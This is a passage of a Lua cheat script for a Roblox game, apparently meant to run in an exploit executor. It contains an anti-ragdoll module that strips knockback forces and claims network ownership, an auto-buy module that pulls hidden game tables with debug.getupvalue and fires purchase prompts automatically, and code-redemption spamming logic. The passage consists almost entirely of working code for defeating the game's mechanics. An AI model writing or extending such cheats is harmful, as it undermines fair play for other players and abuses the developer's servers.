    if _G.__AntiRagdollToggleCleanup then pcall(_G.__AntiRagdollToggleCleanup) end

    local RAGDOLL_KEYWORDS = {
        "ragdoll", "knock", "launch", "stun", "fall", "down",
        "flop", "trip", "push", "shove", "blast", "force",
    }
    local FORCE_CLASSES = {
        "BodyVelocity", "BodyPosition", "BodyGyro", "BodyForce",
        "BodyAngularVelocity", "RocketPropulsion", "BodyThrust",
        "LinearVelocity", "AngularVelocity", "VectorForce", "Torque",
    }

    local function isForce(inst)
        for _, c in ipairs(FORCE_CLASSES) do
            if inst:IsA(c) then return true end
        end
        return false
    end

    local function hasRagdollName(name)
        local lower = name:lower()
        for _, kw in ipairs(RAGDOLL_KEYWORDS) do
            if lower:find(kw) then return true end
        end
        return false
    end

    local function getRig()
        local character = localPlayer.Character
        if not character then return end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local root     = character:FindFirstChild("HumanoidRootPart")
        local animator = humanoid and humanoid:FindFirstChildOfClass("Animator")
        if humanoid and root and animator then
            return character, humanoid, root, animator
        end
    end

    local function isJumping(humanoid)
        if tick() < antiRagdoll.JumpPauseUntil then return true end
        if humanoid then
            local st = humanoid:GetState()
            if st == Enum.HumanoidStateType.Jumping or st == Enum.HumanoidStateType.Freefall then
                return true
            end
        end
        return false
    end

    local function destroyWelds()
        for _, w in ipairs(antiRagdoll.Welds) do
            pcall(function() w:Destroy() end)
        end
        antiRagdoll.Welds = {}
    end

    local function weldToRoot(character, root)
        if not character or not root then return end
        destroyWelds()
        for _, d in ipairs(character:GetDescendants()) do
            if d:IsA("BasePart") and d ~= root then
                local w = Instance.new("WeldConstraint")
                w.Name = "AntiRagdollWeld"
                w.Part0 = root
                w.Part1 = d
                w.Parent = root
                table.insert(antiRagdoll.Welds, w)
            end
        end
    end

    local function setStates(humanoid, enabled)
        pcall(function()
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, enabled)
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics, enabled)
            humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, enabled)
            humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding, enabled)
        end)
    end

    local function stripConstraints(character, root)
        if not character then return end
        for _, d in ipairs(character:GetDescendants()) do
            if d:IsA("BallSocketConstraint") or d:IsA("HingeConstraint")
               or d:IsA("RopeConstraint") or d:IsA("RodConstraint") then
                pcall(function() d:Destroy() end)
            elseif isForce(d) then
                local parent = d.Parent
                local pname = parent and parent.Name or ""
                if parent == root or hasRagdollName(d.Name) or hasRagdollName(pname) then
                    pcall(function() d:Destroy() end)
                end
            end
        end
    end

    local function enableMotors(character)
        if not character then return end
        for _, d in ipairs(character:GetDescendants()) do
            if d:IsA("Motor6D") then d.Enabled = true end
        end
    end

    local function applyPhysics(character, root)
        if not character then return end
        for _, d in ipairs(character:GetDescendants()) do
            if d:IsA("BasePart") then
                if d == root then
                    d.CanCollide = false
                    d.Massless = false
                    pcall(function()
                        d.CustomPhysicalProperties = PhysicalProperties.new(50, 0.3, 0.5, 100, 100)
                    end)
                else
                    d.CanCollide = false
                    d.Massless = true
                end
            end
        end
    end

    local function claimOwnership(root)
        pcall(function()
            if root:CanSetNetworkOwnership() then
                root:SetNetworkOwner(localPlayer)
            end
        end)
    end

    local function restoreHumanoid(character, humanoid, root)
        if not character or not humanoid or humanoid.Health <= 0 then return end
        humanoid.PlatformStand = false
        humanoid.Sit = false
        humanoid.AutoRotate = true
        humanoid.BreakJointsOnDeath = false
        humanoid.RequiresNeck = false
        if humanoid.WalkSpeed < 1 then humanoid.WalkSpeed = 16 end
        if humanoid.JumpPower < 1 and humanoid.JumpHeight < 1 then humanoid.JumpPower = 50 end
        enableMotors(character)
        applyPhysics(character, root)
        local cam = workspace.CurrentCamera
        if cam and cam.CameraSubject ~= humanoid then
            cam.CameraSubject = humanoid
        end
    end

    local function groundDirection(root)
        local cam = workspace.CurrentCamera
        local dir = cam and cam.CFrame.LookVector or root.CFrame.LookVector
        local v = Vector3.new(dir.X, 0, dir.Z)
        if v.Magnitude < 0.05 then
            local lv = root.CFrame.LookVector
            v = Vector3.new(lv.X, 0, lv.Z)
        end
        if v.Magnitude < 0.05 then return Vector3.new(0, 0, -1) end
        return v.Unit
    end

    local function clampVelocity(root)
        local v = root.AssemblyLinearVelocity
        root.AssemblyAngularVelocity = Vector3.zero
        root.AssemblyLinearVelocity = Vector3.new(
            math.clamp(v.X, -antiRagdoll.MaxHorizontalVelocity, antiRagdoll.MaxHorizontalVelocity),
            math.clamp(v.Y, -50, antiRagdoll.MaxUpwardVelocity),
            math.clamp(v.Z, -antiRagdoll.MaxHorizontalVelocity, antiRagdoll.MaxHorizontalVelocity)
        )
    end

    local function upright(character, humanoid, root, hard)
        if not character or not humanoid or not root or humanoid.Health <= 0 then return end
        restoreHumanoid(character, humanoid, root)
        local dir = groundDirection(root)
        if not isJumping(humanoid) then clampVelocity(root) end
        root.CFrame = root.CFrame:Lerp(CFrame.lookAt(root.Position, root.Position + dir), hard and 1 or 0.5)
        humanoid.PlatformStand = false
        humanoid.Sit = false
        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
        task.defer(function()
            if humanoid.Parent and humanoid.Health > 0 then
                humanoid:ChangeState(Enum.HumanoidStateType.Running)
            end
        end)
    end

    local function stopRagdollAnimations(animator)
        if not animator then return end
        for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
            local name = (track.Animation and track.Animation.Name) or ""
            if hasRagdollName(name) then
                track:Stop(0)
            end
        end
    end

    local function fullReset(character, humanoid, root, animator)
        if not character or not humanoid or humanoid.Health <= 0 then return end
        stripConstraints(character, root)
        restoreHumanoid(character, humanoid, root)
        stopRagdollAnimations(animator)
        claimOwnership(root)
        pcall(function()
            local pm = localPlayer.PlayerScripts:FindFirstChild("PlayerModule")
            if pm then
                local controls = require(pm):GetControls()
                if controls then controls:Enable() end
            end
        end)
    end

    antiRagdoll.Disable = function(self)
        self.Enabled = false
        self.LastPosition = nil
        self.JumpPauseUntil = 0
        for _, c in ipairs(self.Connections) do
            pcall(function() c:Disconnect() end)
        end
        self.Connections = {}
        destroyWelds()
        local _, humanoid = getRig()
        if humanoid then setStates(humanoid, true) end
    end

    antiRagdoll.Enable = function(self)
        if self.Enabled then return end
        self.Enabled = true

        local character, humanoid, root, animator = getRig()
        if not character then self.Enabled = false; return end

        fullReset(character, humanoid, root, animator)
        setStates(humanoid, false)
        upright(character, humanoid, root, true)
        weldToRoot(character, root)
        self.LastPosition = root.Position

        table.insert(self.Connections, UserInputService.JumpRequest:Connect(function()
            if not self.Enabled then return end
            self.JumpPauseUntil = tick() + self.JumpPauseDuration
        end))

        table.insert(self.Connections, UserInputService.InputBegan:Connect(function(input, processed)
            if not self.Enabled or processed then return end
            if input.KeyCode == Enum.KeyCode.Space or input.KeyCode == Enum.KeyCode.ButtonA then
                self.JumpPauseUntil = tick() + self.JumpPauseDuration
            end
        end))

        table.insert(self.Connections, RunService.Stepped:Connect(function()
            if not self.Enabled then return end
            local c, h, r = getRig()
            if not c or h.Health <= 0 then return end
            if not isJumping(h) then clampVelocity(r) end
            claimOwnership(r)
        end))

        table.insert(self.Connections, RunService.Heartbeat:Connect(function()
            if not self.Enabled then return end
            local c, h, r, a = getRig()
            if not c or h.Health <= 0 then return end
            setStates(h, false)
            restoreHumanoid(c, h, r)
            stripConstraints(c, r)

            local jumping = isJumping(h)
            local state = h:GetState()
            local badState =
                   state == Enum.HumanoidStateType.Ragdoll
                or state == Enum.HumanoidStateType.Physics
                or state == Enum.HumanoidStateType.FallingDown
                or state == Enum.HumanoidStateType.PlatformStanding
                or state == Enum.HumanoidStateType.Seated
            local tilted = r.CFrame.UpVector.Y < 0.85

            if badState or tilted then
                upright(c, h, r, tilted and r.CFrame.UpVector.Y < 0.5)
                stopRagdollAnimations(a)
            end

            if jumping then
                self.LastPosition = r.Position
                return
            end

            if self.LastPosition then
                local d = r.Position - self.LastPosition
                local flat = Vector3.new(d.X, 0, d.Z)
                if flat.Magnitude > self.MaxFrameDisplacement then
                    local snap = self.LastPosition + flat.Unit * self.MaxFrameDisplacement
                    r.CFrame = CFrame.new(snap.X, r.Position.Y, snap.Z) * (r.CFrame - r.Position)
                    r.AssemblyLinearVelocity = Vector3.zero
                    r.AssemblyAngularVelocity = Vector3.zero
                end
            end
            self.LastPosition = r.Position

            if r.AssemblyLinearVelocity.Magnitude > self.KnockbackThreshold then
                r.AssemblyLinearVelocity = Vector3.zero
                r.AssemblyAngularVelocity = Vector3.zero
                fullReset(c, h, r, a)
            else
                clampVelocity(r)
            end
        end))

        table.insert(self.Connections, humanoid.StateChanged:Connect(function(_, new)
            if not self.Enabled then return end
            if new == Enum.HumanoidStateType.Ragdoll
               or new == Enum.HumanoidStateType.Physics
               or new == Enum.HumanoidStateType.FallingDown
               or new == Enum.HumanoidStateType.PlatformStanding then
                humanoid.PlatformStand = false
                humanoid.Sit = false
                humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                humanoid:ChangeState(Enum.HumanoidStateType.Running)
                local c, h, r, a = getRig()
                if c then
                    fullReset(c, h, r, a)
                    upright(c, h, r, true)
                end
            end
        end))

        table.insert(self.Connections, character.DescendantAdded:Connect(function(d)
            if not self.Enabled then return end
            if d:IsA("Motor6D") then
                d.Enabled = true
                return
            end
            if d:IsA("BasePart") then
                task.wait()
                local c, _, r = getRig()
                if c and r and d ~= r and d.Parent then
                    local w = Instance.new("WeldConstraint")
                    w.Name = "AntiRagdollWeld"
                    w.Part0 = r
                    w.Part1 = d
                    w.Parent = r
                    table.insert(antiRagdoll.Welds, w)
                end
                return
            end
            if d:IsA("BallSocketConstraint") or d:IsA("HingeConstraint")
               or d:IsA("RopeConstraint") or d:IsA("RodConstraint") then
                task.wait()
                pcall(function() d:Destroy() end)
                return
            end
            if isForce(d) then
                local _, _, r = getRig()
                local pname = d.Parent and d.Parent.Name or ""
                if d.Parent == r or hasRagdollName(d.Name) or hasRagdollName(pname) then
                    task.wait()
                    pcall(function() d:Destroy() end)
                end
            end
        end))

        table.insert(self.Connections, character.DescendantRemoving:Connect(function(d)
            if not self.Enabled then return end
            if d:IsA("Motor6D") then
                task.defer(function()
                    local c = localPlayer.Character
                    if c then enableMotors(c) end
                end)
            end
        end))

        table.insert(self.Connections, localPlayer.CharacterAdded:Connect(function()
            task.wait(1)
            if self.Enabled then
                self:Disable()
                self:Enable()
            end
        end))
    end
end

local antiRagdollWindow, antiRagdollStatusDot, antiRagdollStatusLabel, antiRagdollToggleBtn
do
    local function removeBillboard()
        local bb = PlayerGui:FindFirstChild("RagCountdownBillboard")
        if bb then bb:Destroy() end
    end
    removeBillboard()

    local ragdollToggle = {
        Enabled = false,
        ResetCooldown = 0,
        V2Connection = nil,
    }

    ragdollToggle.Disable = function(self)
        self.Enabled = false
        self.ResetCooldown = 0
        removeBillboard()
        if self.V2Connection then
            self.V2Connection:Disconnect()
            self.V2Connection = nil
        end
    end

    ragdollToggle.Enable = function(self)
        if self.V2Connection then return end
        self.Enabled = true
        self.ResetCooldown = 0
        self.V2Connection = RunService.Heartbeat:Connect(function()
            if not self.Enabled then return end
            local c = localPlayer.Character
            if not c then return end
            local h = c:FindFirstChildOfClass("Humanoid")
            local r = c:FindFirstChild("HumanoidRootPart")
            if not h or not r or h.Health <= 0 then return end
            local st = h:GetState()
            local now = tick()
            if st == Enum.HumanoidStateType.Physics
               or st == Enum.HumanoidStateType.Ragdoll
               or st == Enum.HumanoidStateType.FallingDown then
                if now - self.ResetCooldown > 0.15 then
                    self.ResetCooldown = now
                    pcall(function()
                        h:ChangeState(Enum.HumanoidStateType.GettingUp)
                        r.Velocity = Vector3.zero
                        r.RotVelocity = Vector3.zero
                        r.AssemblyLinearVelocity = Vector3.zero
                        r.AssemblyAngularVelocity = Vector3.zero
                        for _, d in ipairs(c:GetDescendants()) do
                            if d:IsA("Motor6D") then d.Enabled = true end
                            if d:IsA("Weld") then d.Enabled = true end
                        end
                        workspace.CurrentCamera.CameraSubject = h
                        local pm = localPlayer.PlayerScripts:FindFirstChild("PlayerModule")
                        pm = pm and pm:FindFirstChild("ControlModule")
                        if pm then
                            local mod = require(pm)
                            if mod and mod.Enable then mod:Enable() end
                        end
                        h.AutoRotate = true
                        h.PlatformStand = false
                        h.Sit = false
                    end)
                end
            end
        end)
    end

    _G.__AntiRagdollToggleCleanup = function()
        pcall(function() ragdollToggle:Disable() end)
    end

    local titleRow
    antiRagdollWindow, titleRow = createWindow("AntiRagdoll", 260, 180, "ANTI RAGDOLL")
    antiRagdollWindow.Visible = false
    antiRagdollWindow.Parent = ScreenGui

    local close = createButton("X", titleRow)
    close.Size = UDim2.fromOffset(22, 22)
    close.Position = UDim2.new(1, -28, 0.5, -11)
    close.TextSize = 12
    close.MouseButton1Click:Connect(function() antiRagdollWindow.Visible = false end)

    local body = create("Frame", {
        Size = UDim2.new(1, -24, 1, -58),
        Position = UDim2.fromOffset(12, 50),
        BackgroundTransparency = 1,
    }, antiRagdollWindow)
    create("UIListLayout", { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder }, body)

    local statusRow = create("Frame", {
        Size = UDim2.new(1, 0, 0, 38),
        BackgroundColor3 = THEME.panel,
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        LayoutOrder = 1,
    }, body)
    corner(statusRow, 9)
    stroke(statusRow, THEME.line, 1, 0.3)

    antiRagdollStatusDot = create("Frame", {
        Size = UDim2.fromOffset(8, 8),
        Position = UDim2.new(0, 12, 0.5, -4),
        BackgroundColor3 = THEME.err,
        BorderSizePixel = 0,
    }, statusRow)
    corner(antiRagdollStatusDot, 4)

    antiRagdollStatusLabel = label("disabled", 12, THEME.txt, FONT_BOLD, Enum.TextXAlignment.Left, statusRow)
    antiRagdollStatusLabel.Size = UDim2.new(1, -32, 1, 0)
    antiRagdollStatusLabel.Position = UDim2.fromOffset(28, 0)

    antiRagdollToggleBtn = createAccentButton("ENABLE", body)
    antiRagdollToggleBtn.Size = UDim2.new(1, 0, 0, 36)
    antiRagdollToggleBtn.LayoutOrder = 2

    local desc = label("rigidifies your character and strips ragdoll forces / states",
        10, THEME.sub, FONT_MED, Enum.TextXAlignment.Left, body)
    desc.Size = UDim2.new(1, 0, 0, 30)
    desc.LayoutOrder = 3
    desc.TextWrapped = true

    local function render()
        local on = antiRagdoll.Enabled
        antiRagdollStatusLabel.Text = on and "enabled - staying upright" or "disabled"
        antiRagdollStatusLabel.TextColor3 = on and THEME.ok or THEME.sub
        antiRagdollStatusDot.BackgroundColor3 = on and THEME.ok or THEME.err
        antiRagdollToggleBtn.Text = on and "DISABLE" or "ENABLE"
        RagBtn.TextColor3 = on and THEME.acc or THEME.txt
    end

    antiRagdollToggleBtn.MouseButton1Click:Connect(function()
        if antiRagdoll.Enabled then
            antiRagdoll:Disable()
        else
            antiRagdoll:Enable()
        end
        render()
    end)

    RagBtn.MouseButton1Click:Connect(function()
        if antiRagdollWindow.Visible then
            antiRagdollWindow.Visible = false
            return
        end
        if touchOnly then
            antiRagdollWindow.Position = UDim2.new(0.5,
                -math.floor(antiRagdollWindow.AbsoluteSize.X / 2), 0.5,
                -math.floor(antiRagdollWindow.AbsoluteSize.Y / 2))
        else
            local p = Main.Position
            antiRagdollWindow.Position = UDim2.new(p.X.Scale, p.X.Offset - antiRagdollWindow.AbsoluteSize.X - 10, p.Y.Scale, p.Y.Offset + 96)
        end
        antiRagdollWindow.Visible = true
    end)

    localPlayer.CharacterAdded:Connect(function()
        task.wait(1)
        render()
    end)
    render()
end

local autoBuyState

do
    autoBuyState = {
        Enabled = false,
        Connections = {},
        Game = nil, Animals = nil, Mutations = nil, Traits = nil,
        Tried = false,
        Models = {},
        PromptConnections = {},
        Heartbeat = nil,
        LastPrompt = nil,
        LastPromptAt = 0,
        WasNearest = false,
    }

    local function getUpvalueByIndex(fn, idx)
        local getUpvalue_ = debug and debug.getupvalue or getupvalue
        local a, b = getUpvalue_(fn, idx)
        return b ~= nil and b or a
    end

    local function hasNumericKey(tbl, key)
        for _, v in pairs(tbl) do
            if type(v) == "table" and tonumber(rawget(v, key)) ~= nil then
                return true
            end
        end
        return false
    end

    local function discoverShared()
        if autoBuyState.Tried then return end
        autoBuyState.Tried = true

        local shared = ReplicatedStorage:FindFirstChild("Shared")
        if not shared then return end
        local animals = shared:FindFirstChild("Animals")
        if not animals then return end

        local ok, mod = pcall(require, animals)
        if not ok or type(mod) ~= "table" then return end

        local gen = rawget(mod, "GetGeneration")
        if type(gen) ~= "function" then return end

        for i = 1, 20 do
            local ok2, up = pcall(getUpvalueByIndex, gen, i)
            if ok2 and type(up) == "table" then
                local gameTbl = rawget(up, "Game")
                if not autoBuyState.Game and type(gameTbl) == "table"
                   and tonumber(rawget(gameTbl, "AnimalGanerationModifier")) then
                    autoBuyState.Game = up
                elseif not autoBuyState.Traits and hasNumericKey(up, "MultiplierModifier") then
                    autoBuyState.Traits = up
                elseif not autoBuyState.Mutations and hasNumericKey(up, "Modifier") then
                    autoBuyState.Mutations = up
                elseif not autoBuyState.Animals
                       and (hasNumericKey(up, "Generation") or hasNumericKey(up, "Price")) then
                    autoBuyState.Animals = up
                end
            end
        end
    end

    local function computeIncome(index, mutation, traits)
        local animal = autoBuyState.Animals and rawget(autoBuyState.Animals, index)
        if type(animal) ~= "table" then return nil, nil end

        local gen = tonumber(rawget(animal, "Generation"))
        if not gen then
            local g = autoBuyState.Game
            if g then
                g = tonumber(rawget(rawget(autoBuyState.Game, "Game") or {}, "AnimalGanerationModifier"))
            end
            gen = (tonumber(rawget(animal, "Price")) or 0) * (g or 0)
        end

        local mult = 1
        if mutation and autoBuyState.Mutations then
            local m = rawget(autoBuyState.Mutations, mutation)
            if type(m) == "table" then mult = 1 + (tonumber(rawget(m, "Modifier")) or 0) end
        end

        local sleepy = false
        if type(traits) == "table" and autoBuyState.Traits then
            for _, t in ipairs(traits) do
                if t == "Sleepy" then
                    sleepy = true
                else
                    local d = rawget(autoBuyState.Traits, t)
                    if type(d) == "table" then
                        mult = mult + (tonumber(rawget(d, "MultiplierModifier")) or 0)
                    end
                end
            end
        end

        local total = gen * mult
        if sleepy then total = total * 0.5 end
        return math.round(total), animal
    end

    local function registerModel(m)
        if m:IsA("Model") and m:GetAttribute("Index") ~= nil then
            autoBuyState.Models[m] = true
        end
    end

    local function findPrompt(model)
        local prim = model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart")
        if not prim then return nil end
        local att = prim:FindFirstChildOfClass("Attachment")
        att = att and att:FindFirstChildOfClass("ProximityPrompt")
        if att and att.Enabled and att.ActionText == "Purchase" then
            return att, prim
        end
    end

    local function findNearest()
        local c = localPlayer.Character
        c = c and c:FindFirstChild("HumanoidRootPart")
        if not c then return nil, nil, math.huge end

        local bestDist = math.huge
        local bestModel, bestPrompt
        for model in pairs(autoBuyState.Models) do
            if model.Parent == workspace then
                local prompt, part = findPrompt(model)
                if prompt then
                    local dist = (c.Position - part.Position).Magnitude
                    if dist < bestDist then
                        bestDist = dist
                        bestModel = model
                        bestPrompt = prompt
                    end
                end
            else
                autoBuyState.Models[model] = nil
            end
        end
        return bestModel, bestPrompt, bestDist
    end

    local function formatNum(n)
        local num = tonumber(n)
        if not num then return tostring(n or "---") end
        local abs = math.abs(num)
        for _, pair in ipairs({
            { 1e12, "T" }, { 1e9, "B" }, { 1e6, "M" }, { 1e3, "K" },
        }) do
            if pair[1] <= abs then
                local v = num / pair[1]
                return string.format(v >= 100 and "%.0f%s" or "%.1f%s", v, pair[2])
            end
        end
        if num % 1 == 0 then return tostring(math.floor(num)) end
        return string.format("%.1f", num)
    end

    local function firePrompt(prompt)
        if not prompt or not prompt.Parent or not prompt.Enabled then
            return false, "prompt gone"
        end
        if type(fireproximityprompt) == "function" then
            local ok = pcall(fireproximityprompt, prompt)
            return ok, ok and nil or "fire failed"
        end
        local ok = pcall(function()
            prompt:InputHoldBegin()
            task.wait(math.max(prompt.HoldDuration, 0.05) + 0.05)
            prompt:InputHoldEnd()
        end)
        return ok, ok and nil or "hold failed"
    end

    local function stopListening()
        for _, c in ipairs(autoBuyState.PromptConnections) do
            pcall(function() c:Disconnect() end)
        end
        autoBuyState.PromptConnections = {}
        autoBuyState.Models = {}
        autoBuyState.Heartbeat = nil
    end

    local function startListening()
        if #autoBuyState.PromptConnections > 0 then return end
        discoverShared()

        for _, m in ipairs(workspace:GetChildren()) do registerModel(m) end
        autoBuyState.PromptConnections[#autoBuyState.PromptConnections + 1] = workspace.ChildAdded:Connect(registerModel)
        autoBuyState.PromptConnections[#autoBuyState.PromptConnections + 1] = workspace.ChildRemoved:Connect(function(m)
            autoBuyState.Models[m] = nil
        end)
        autoBuyState.PromptConnections[#autoBuyState.PromptConnections + 1] = RunService.Heartbeat:Connect(function(dt)
            if autoBuyState.Heartbeat then autoBuyState.Heartbeat(dt) end
        end)
    end

    local win, titleRow = createWindow("AutoBuy", 300, 306, "AUTO BUY")
    win.Visible = false
    win.Parent = ScreenGui

    local close = createButton("X", titleRow)
    close.Size = UDim2.fromOffset(22, 22)
    close.Position = UDim2.new(1, -28, 0.5, -11)
    close.TextSize = 12
    close.MouseButton1Click:Connect(function()
        win.Visible = false
        if openSettings then openSettings() end
    end)

    local body = create("Frame", {
        Size = UDim2.new(1, -24, 1, -58),
        Position = UDim2.fromOffset(12, 50),
        BackgroundTransparency = 1,
    }, win)
    create("UIListLayout", { Padding = UDim.new(0, 6), SortOrder = Enum.SortOrder.LayoutOrder }, body)

    local statusRow = create("Frame", {
        Size = UDim2.new(1, 0, 0, 32),
        BackgroundColor3 = THEME.panel,
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        LayoutOrder = 1,
    }, body)
    corner(statusRow, 9)
    stroke(statusRow, THEME.line, 1, 0.3)

    local statusDot = create("Frame", {
        Size = UDim2.fromOffset(8, 8),
        Position = UDim2.new(0, 12, 0.5, -4),
        BackgroundColor3 = THEME.line,
        BorderSizePixel = 0,
    }, statusRow)
    corner(statusDot, 4)

    local statusLabel = label("idle", 12, THEME.sub, FONT_BOLD, Enum.TextXAlignment.Left, statusRow)
    statusLabel.Size = UDim2.new(1, -32, 1, 0)
    statusLabel.Position = UDim2.fromOffset(28, 0)
    statusLabel.TextTruncate = Enum.TextTruncate.AtEnd

    local function setStatus(text, kind)
        statusLabel.Text = text
        local c = kind == "ok"   and THEME.ok
              or  kind == "err"  and THEME.err
              or  kind == "busy" and THEME.acc
              or  kind == "wait" and THEME.warn
              or  THEME.sub
        statusLabel.TextColor3 = c
        statusDot.BackgroundColor3 = c
    end

    createToggle(body, 2, "AUTO BUY", false, function(enabled)
        autoBuyState.Enabled = enabled
        if enabled then startListening() else stopListening() end
        if not enabled then
            setStatus("idle", nil)
        else
            setStatus("armed - looking for a buy...", "wait")
        end
    end)

    local heading = label("NEAREST BUYABLE", 9, THEME.acc, FONT_BLACK, Enum.TextXAlignment.Left, body)
    heading.Size = UDim2.new(1, 0, 0, 14)
    heading.LayoutOrder = 3

    local function stat(order, text, color, size)
        local lbl = label(text, 11, color or THEME.sub, FONT_BOLD, Enum.TextXAlignment.Left, body)
        lbl.Size = UDim2.new(1, 0, 0, size or 16)
        lbl.LayoutOrder = order
        lbl.TextTruncate = Enum.TextTruncate.AtEnd
        return lbl
    end

    local nameLbl   = stat(4, "Name: ---", THEME.txt)
    local incomeLbl = stat(5, "Income: --- /sec", THEME.acc)
    local rarLbl    = stat(6, "Rarity: ---")
    local mutLbl    = stat(7, "Mutation: ---")
    local traitsLbl = stat(8, "Traits: ---", THEME.sub, 30)
    traitsLbl.TextWrapped = true
    traitsLbl.TextYAlignment = Enum.TextYAlignment.Top
    local distLbl = stat(9, "Distance: ---", THEME.sub, 14)
    distLbl.TextSize = 9

    local function clearStats()
        nameLbl.Text   = "Name: ---"
        incomeLbl.Text = "Income: --- /sec"
        rarLbl.Text    = "Rarity: ---"
        mutLbl.Text    = "Mutation: ---"
        traitsLbl.Text = "Traits: ---"
        distLbl.Text   = "Distance: ---"
    end

    local function renderStats(model, prompt, distance)
        if not (model and prompt) then
            clearStats()
            return
        end

        local index    = model:GetAttribute("Index")
        local mutation = model:GetAttribute("Mutation")
        local traitsAttr = model:GetAttribute("Traits")

        local traits
        if type(traitsAttr) == "string" and traitsAttr ~= "" then
            traits = { traitsAttr }
        else
            traits = traitsAttr
        end

        local income, animal = computeIncome(index, mutation, traits)
        local price = animal and rawget(animal, "Price")

        nameLbl.Text = "Name: " .. tostring(
            (animal and rawget(animal, "DisplayName"))
            or index or prompt.ObjectText or "---")
            .. (price and (" ($" .. formatNum(price) .. ")") or "")

        incomeLbl.Text = "Income: " .. formatNum(income) .. " /sec"
        rarLbl.Text    = "Rarity: " .. tostring(animal and rawget(animal, "Rarity") or "---")
        mutLbl.Text    = "Mutation: " .. tostring(mutation or "---")
        traitsLbl.Text = "Traits: " .. (type(traits) == "table" and #traits > 0 and table.concat(traits, ", ") or "---")
        distLbl.Text   = string.format("Distance: %.1f studs", distance)
    end

    autoBuyState.Heartbeat = function(dt)
        if not autoBuyState.Enabled then
            if autoBuyState.WasNearest then
                clearStats()
                autoBuyState.WasNearest = false
            end
            return
        end

        autoBuyState.Accum = (autoBuyState.Accum or 0) + dt
        if autoBuyState.Accum < 0.2 then return end
        autoBuyState.Accum = 0

        local model, prompt, dist = findNearest()
        renderStats(model, prompt, dist)
        autoBuyState.WasNearest = prompt ~= nil

        if not prompt then
            setStatus("no buy prompt in range", "wait")
            return
        end

        if dist > (prompt.MaxActivationDistance or 10) + 2 then
            setStatus("move closer to buy", "wait")
            return
        end

        local now = os.clock()
        if prompt ~= autoBuyState.LastPrompt or now - autoBuyState.LastPromptAt >= 1.2 then
            autoBuyState.LastPrompt = prompt
            autoBuyState.LastPromptAt = now
            setStatus("buying...", "busy")
            task.spawn(function()
                local ok, err = firePrompt(prompt)
                if ok then
                    setStatus("bought!", "ok")
                elseif autoBuyState.Enabled then
                    setStatus(err or "buy failed", "err")
                end
            end)
        end
    end

    openAutoBuy = function()
        if touchOnly then
            win.Position = UDim2.new(0.5, -math.floor(win.AbsoluteSize.X / 2), 0.5, -math.floor(win.AbsoluteSize.Y / 2))
        else
            local p = Main.Position
            win.Position = UDim2.new(p.X.Scale, p.X.Offset - win.AbsoluteSize.X - 10, p.Y.Scale, p.Y.Offset)
        end
        win.Visible = true
    end

    stopAutoBuy = function()
        autoBuyState.Enabled = false
        stopListening()
        for _, c in ipairs(autoBuyState.Connections) do
            pcall(function() c:Disconnect() end)
        end
        autoBuyState.Connections = {}
    end
end

local rejectionCache = { text = "", at = 0 }

do
    local function watchTextLabel(lbl)
        task.defer(function()
            if not lbl.Parent then return end
            local targets = lbl:IsA("TextLabel") and { lbl } or lbl:GetDescendants()
            for _, d in ipairs(targets) do
                if d:IsA("TextLabel") and d.Text ~= "" then
                    rejectionCache.text = stripTags(d.Text):lower()
                    rejectionCache.at = os.clock()
                    return
                end
            end
        end)
    end

    local function watchContainer(container)
        if not container then return end
        container.DescendantAdded:Connect(watchTextLabel)
        for _, d in ipairs(container:GetDescendants()) do
            if d:IsA("TextLabel") then
                d:GetPropertyChangedSignal("Text"):Connect(function()
                    if d.Text ~= "" then
                        rejectionCache.text = stripTags(d.Text):lower()
                        rejectionCache.at = os.clock()
                    end
                end)
            end
        end
    end

    watchContainer(PlayerGui:FindFirstChild("Notification"))
    watchContainer(PlayerGui:FindFirstChild("Notifications"))
    watchContainer(PlayerGui:FindFirstChild("Announcement"))
end

local function findCooldownMessage(since)
    if rejectionCache.at <= (since or 0) then return nil end
    if os.clock() - rejectionCache.at > 3 then return nil end
    for _, pat in ipairs({
        "base is full", "sold out", "out of stock", "already redeemed",
        "already used", "code redeemed", "you have already",
    }) do
        if rejectionCache.text:find(pat, 1, true) then return pat end
    end
end

local doRedeem, spamOnWord, setCodeText, listenHint, idleHint, setListening,
      handleCaptured, retryConfirm, toggleListen

do
    doRedeem = function(code, prefix)
        local clean = trim(code)
        if clean == "" then
            setStatus("nothing to redeem", "err")
            return false, false
        end
        prefix = prefix and (prefix .. " ") or ""
        setStatus(("%sredeeming: %s"):format(prefix, clean), "busy")

        local ok, res = submitCode(clean)
        local isTable = ok and type(res) == "table"
        if isTable and (res.success or res.Success) then
            setStatus(("%sredeemed: %s"):format(prefix, clean), "ok")
        elseif isTable then
            setStatus(("%srejected: %s"):format(prefix, clean), "err")
        elseif ok then
            setStatus(("%ssent: %s"):format(prefix, clean), "busy")
        else
            setStatus(("%sfailed to send: %s"):format(prefix, clean), "err")
        end
        return ok, isTable
    end

    local function redeemAndType(text)
        codeBox.Text = text
        doRedeem(text)
    end
    _G.__TracedUse = redeemAndType

    spamOnWord = function(word)
        if isSpamming and isListening and wordMode then
            spamCount = spamCount + 1
            doRedeem(word, ("[spam %d]"):format(spamCount))
        end
    end

    local spamTick
    local function setSpamming(enabled)
        if enabled and not isListening then
            setStatus("turn LISTEN on first", "err")
            return
        end
        if enabled == isSpamming then return end
        isSpamming = enabled
        spamStartBtn.Text = enabled and "STOP" or "START"
        spamStartBtn.TextColor3 = enabled and THEME.acc or THEME.txt
        tween(spamDot,   0.16, { BackgroundColor3 = enabled and THEME.acc or THEME.line })
        tween(spamLabel, 0.16, { TextColor3 = enabled and THEME.txt or THEME.sub })
        tween(spamStroke, 0.16, { Color = enabled and THEME.acc or THEME.line, Transparency = enabled and 0.15 or 0.3 })
        if enabled then
            spamCount = 0
            spamThread = task.spawn(spamTick)
        else
            spamThread = nil
            if isListening then setStatus("spam stopped", "wait") end
        end
    end

    spamTick = function()
        while isSpamming and isListening do
            if wordMode then
                if spamCount == 0 then setStatus("spam - redeem on every word", "wait") end
